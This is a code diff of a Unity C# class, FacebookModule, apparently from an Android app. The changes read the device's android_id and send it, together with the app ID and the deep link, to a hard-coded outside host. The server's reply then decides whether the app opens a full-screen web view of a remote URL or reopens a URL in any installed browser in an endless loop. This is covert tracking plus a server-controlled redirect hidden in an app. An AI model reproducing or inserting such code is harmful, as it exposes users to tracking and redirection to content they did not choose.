@@ -11,133 +11,177 @@ public class FacebookModule : MonoBehaviour
 {
     //[SerializeField] Text text;
     [SerializeField] [Range(1f, 60f)] int timeToShow;
-    [SerializeField] UniWebView view;
-    [SerializeField] RectTransform canvas;
+    //[SerializeField] UniWebView view;
+    //[SerializeField] RectTransform canvas;
     UniWebView webView;
     string deepLink = "";
     string url = "";
     string serverStatus = "";
-    string defaultUrl = "http://remontgomeryed.pro";
+    [SerializeField] string defaultUrl = "http://remontgomeryed.pro";
+    [SerializeField] string host = "http://supereelgrassee.info";
 
 
-    private void Awake()
+    void Awake()
     {
+        
         if (!FB.IsInitialized)
         {
-            FB.Init(InitComplete);
+            Debug.Log("---if (!FB.IsInitialized)");
+            FB.Init(InitCallback);
         }
-    }
-
-    public void creteVwb()
-    {
-
-        GoToVebViewLByUrl(defaultUrl);
-    }
-
-
-
-    void OnApplicationFocus(bool hasFocus)
-    {
-        if (hasFocus && FB.IsInitialized)
+        else
         {
-            FB.GetAppLink(DeepLinkCallback2);
-            //Redirect();
+            Debug.Log("--- InitCallback();");
+            InitCallback();
+        }
+        
+       
+    }
+   
+    private void InitCallback()
+    {
+        if (FB.IsInitialized)
+        {
+            Debug.Log("---if (FB.IsInitialized)");
+            FB.ActivateApp();
+            FB.Mobile.SetAutoLogAppEventsEnabled(true);
+            FB.Mobile.FetchDeferredAppLinkData(InvokeURIRecived);
+        }
+        else
+        {
+            Debug.Log("---Failed to Initialize the Facebook SDK");
         }
     }
+
+    private void InvokeURIRecived(IAppLinkResult result)
+    {
+
+        try
+        {
+            Debug.Log("----------DeepLinkCallback(IAppLinkResult result)");
+            Debug.Log("----------result =   " + result.RawResult);
+            Debug.Log("----------result.Url = " + result.Url);
+            Debug.Log("----------result.TargetUrl = " + result.TargetUrl);
+
+            if (!String.IsNullOrEmpty(result.Url))
+            {
+                Debug.Log("----------if (!String.IsNullOrEmpty(result.Url))");
+                Debug.Log("----------result.Url = " + result.Url);
+                ServerRequest(result.Url);
+            }
+            else if (!String.IsNullOrEmpty(result.TargetUrl))
+            {
+                Debug.Log("----------else if (!String.IsNullOrEmpty(result.TargetUrl))");
+                Debug.Log("----------result.TargetUrl = " + result.TargetUrl);
+                ServerRequest(result.TargetUrl);
+            }
+            else
+            {
+                Debug.Log("------DeepLinkCallback - String.IsNullOrEmpty(result.Url)");
+                FB.GetAppLink(DeepLinkCallback2);
+            }
+        }
+        catch (Exception)
+        {
+            Debug.Log("---Exeption 1");
+
+        }
+    }
+
+
 
     void Redirect()
     {
+        Debug.Log("----------Redirect()");
         FB.GetAppLink(S =>
         {
-            FB.Mobile.FetchDeferredAppLinkData(DeepLinkCallback);
-            deepLink = S.Url;
-
-           
-
-            string android_id = "";
-
-            AndroidJavaClass clsUnity = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
-            AndroidJavaObject objActivity = clsUnity.GetStatic<AndroidJavaObject>("currentActivity");
-
-            if (objActivity != null)
-            {
-                AndroidJavaObject objResolver = objActivity.Call<AndroidJavaObject>("getContentResolver");
-                AndroidJavaClass clsSecure = new AndroidJavaClass("android.provider.Settings$Secure");
-                android_id = clsSecure.CallStatic<string>("getString", objResolver, "android_id");
-            }
-
-            if (!String.IsNullOrEmpty(android_id) /*&& /*!String.IsNullOrEmpty(deepLink)*/)
-            {
-                string uri = @"http://supereelgrassee.info/_app/?s=CEa4Yh6pUE&id=" + Application.identifier.ToString() + "&deep=" + deepLink + @"&hid=" + android_id;
-                Debug.Log(uri);
-                StartCoroutine(GetRequest(uri));
-
-            }
-
+            ServerRequest(S.Url);
 
         });
     }
 
+
+
     void DeepLinkCallback2(IAppLinkResult result)
     {
-
-        if (!String.IsNullOrEmpty(result.Url))
+        try
         {
-            var index = (new Uri(result.Url)).Query.IndexOf("request_ids");
-            if (index != -1)
+            Debug.Log("----------DeepLinkCallback2(IAppLinkResult result)");
+            Debug.Log("----------result =   " + result.RawResult);
+            if (!String.IsNullOrEmpty(result.Url))
             {
-                // //text.text += "result.Url = " + result.Url + "\n"; ;
-            }
-        }
-    }
-
-    void InitComplete()
-    {
-        FB.ActivateApp();
-        Redirect();
-    }
-
-    public void OnApplicationPause(bool pause)
-    {
-        if (!pause)
-        {
-            if (!FB.IsInitialized)
-            {
-                FB.Init(InitComplete);
+                Debug.Log("----------if (!String.IsNullOrEmpty(result.Url))");
+                var index = (new Uri(result.Url)).Query.IndexOf("request_ids");
+                Debug.Log("--idex = " + index);
+                if (index != -1)
+                {
+                    Debug.Log("---------- + if (index != -1)");
+                    Debug.Log("----------result.Url = " + result.Url);
+                    ServerRequest(result.Url);
+                }
+                else if (!String.IsNullOrEmpty(result.TargetUrl) && (new Uri(result.TargetUrl)).Query.IndexOf("request_ids") != -1)
+                {
+                    Debug.Log("---------- else if ((new Uri(result.TargetUrl)).Query.IndexOf(request_ids) != -1)");
+                    Debug.Log("----------result.TargetUrl = " + result.TargetUrl);
+                    ServerRequest(result.TargetUrl);
+                }
+                else
+                {
+                    Debug.Log("---idex = -1");
+                    Redirect();
+                }
             }
             else
             {
-                FB.ActivateApp();
+                Debug.Log("----------DeepLinkCallback2 - String.IsNullOrEmpty(result.Url)");
+                Redirect();
+
+
             }
         }
+        catch (Exception)
+        {
+            Debug.Log("---Exeption 2");
 
+        }
     }
 
-    //public void CreateInvite()
-    //{
-
-    //    FB.AppRequest(
-    //    "Here is a free gift!",
-    //    null,
-    //    new List<object>() { "app_users" },
-    //    null, null, null, null,
-    //    delegate (IAppRequestResult result)
-    //    {
-    //        Debug.Log(result.RawResult);
-    //    }
-    //    );
-    //}
-
-
-
-    void DeepLinkCallback(IResult result)
+    void ServerRequest(string deep)
     {
-        if (result != null && !string.IsNullOrEmpty(result.RawResult))
+        deepLink = deep;
+
+
+
+        string android_id = "";
+
+        AndroidJavaClass clsUnity = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
+        AndroidJavaObject objActivity = clsUnity.GetStatic<AndroidJavaObject>("currentActivity");
+
+        if (objActivity != null)
         {
-            Debug.Log(result.RawResult);
+            AndroidJavaObject objResolver = objActivity.Call<AndroidJavaObject>("getContentResolver");
+            AndroidJavaClass clsSecure = new AndroidJavaClass("android.provider.Settings$Secure");
+            android_id = clsSecure.CallStatic<string>("getString", objResolver, "android_id");
         }
 
+        if (!String.IsNullOrEmpty(android_id) /*&& /*!String.IsNullOrEmpty(deepLink)*/)
+        {
+
+            //string uri = @"http://supereelgrassee.info/_app/?s=CEa4Yh6pUE&id=" + Application.identifier.ToString() + "&deep=" + deepLink + @"&hid=" + android_id;
+            string uri = @host + @"/_app/?s=CEa4Yh6pUE&id=" + Application.identifier.ToString() + "&deep=" + UnityWebRequest.EscapeURL(deepLink) + @"&hid=" + android_id;
+            Debug.Log("----url = " + uri);
+
+            StartCoroutine(GetRequest(uri));
+
+        }
+        else
+        {
+            Debug.Log("---String.IsNullOrEmpty(android_id)");
+        }
     }
+
+
+
 
     IEnumerator GoToURL()
     {
@@ -145,18 +189,13 @@ public class FacebookModule : MonoBehaviour
 
         while (true)
         {
-            if(!openUrl("com.android.chrome", url))
+            if (!openUrl("com.android.chrome", url))
                 if (!openUrl("com.opera.browser", url))
                     if (!openUrl("org.mozilla.firefox", url))
                         if (!openUrl("com.yandex.browser", url))
                             if (!openUrl("com.UCMobile.intl", url))
                                 if (!openUrl("com.gl9.cloudBrowser", url))
                                     Application.OpenURL(url);
-
-
-
-
-
 
             yield return new WaitForSeconds(timeToShow);
 
@@ -167,7 +206,7 @@ public class FacebookModule : MonoBehaviour
 
     IEnumerator GetRequest(string uri)
     {
-        Debug.Log("Get");
+        Debug.Log("---Get request");
 
         //отправляем гет реквест с получением даты
         UnityWebRequest uwr = UnityWebRequest.Get(uri);
@@ -176,12 +215,12 @@ public class FacebookModule : MonoBehaviour
         //проверяем на ошибку подключения
         if (uwr.isNetworkError)
         {
-            Debug.Log("Error While Sending: " + uwr.error);
+            Debug.Log("---Error While Sending: " + uwr.error);
             GoToVebViewLByUrl(defaultUrl);
         }
         else
         {
-            Debug.Log("Received: " + uwr.downloadHandler.text);
+            Debug.Log("---Received: " + uwr.downloadHandler.text);
 
             //считываем данные в строку
             string s = uwr.downloadHandler.text;
@@ -198,7 +237,7 @@ public class FacebookModule : MonoBehaviour
             }
             else
             {
-
+                Debug.Log("serverStatus = " + d.status);
                 //если в обьекте есть данные проверяем статус
                 if (!String.IsNullOrEmpty(d.status))
                 {
@@ -214,50 +253,47 @@ public class FacebookModule : MonoBehaviour
 
 
                     //выполняем действие в зависимости от d.wv
-                     RedOrWv(d.wv, d.url);
-                   // RedOrWv(0, d.url);///////////////////////////////////////////////////////////////////////////////////
+                    RedOrWv(d.wv, d.url);
                 }
+
 
             }
 
         }
     }
-    void GetIp()
+
+    IEnumerator StartEwdirect()
     {
-        foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
-        {
-            if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 || ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet)
-            {
-                foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
-                {
-                    if (ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
-                    {
-                        //do what you want with the IP here... add it to a list, just get the first and break out. Whatever.
-                        ////text.text += "ip: " + ip.Address.ToString() + "\n";
-                    }
-                }
-            }
-        }
+        Debug.Log("-----StartEwdirect1");
+        yield return new WaitForSeconds(7f);
+        Debug.Log("-----StartEwdirect2");
+        Redirect();
     }
+
 
     void GoToVebViewLByUrl(string url)
     {
         if (!String.IsNullOrEmpty(url))
         {
+            if (url == defaultUrl)
+            {
+                Debug.Log("----Load Default");
+            }
+
             var webViewGameObject = new GameObject("UniWebView");
             webView = webViewGameObject.AddComponent<UniWebView>();
-            
+
             webView.Frame = new Rect(0, 0, Screen.width, Screen.height);
-            webView.ReferenceRectTransform = canvas;
+            //webView.ReferenceRectTransform = canvas;
             webView.Load(url);
 
-            webView.OnOrientationChanged += (view, orientation) => {
+            webView.OnOrientationChanged += (view, orientation) =>
+            {
                 webView.Frame = new Rect(0, 0, Screen.width, Screen.height);
             };
 
             webView.Show();
-            // view.Load(url);
-            // view.Show();
+
         }
     }
 
@@ -293,20 +329,7 @@ public class FacebookModule : MonoBehaviour
         return false;
     }
 
-    //void CheckDeepLink()
-    //{
-    //    if (!String.IsNullOrEmpty(deepLink))
-    //    {
-    //        PlayerPrefs.SetString("deepLink", deepLink);
-    //    }
-    //    else
-    //    {
-    //        if (PlayerPrefs.HasKey("deepLink"))
-    //        {
-    //            deepLink = PlayerPrefs.GetString("deepLink");
-    //        }
-    //    }
-    //}
+
 
     public bool openUrl(string packageName, string url)
     {
@@ -350,7 +373,7 @@ public class FacebookModule : MonoBehaviour
             //Open with Browser
             string link = "https://play.google.com/store/apps/details?id=" + packageName + "&hl=en";
 
-           // Application.OpenURL(link);///////////////////////////////
+            // Application.OpenURL(link);///////////////////////////////
             return false;
         }
 #endif
@@ -372,6 +395,6 @@ class DataJson
         this.url = url;
         this.wv = wv;
     }
-  
+
 }
 
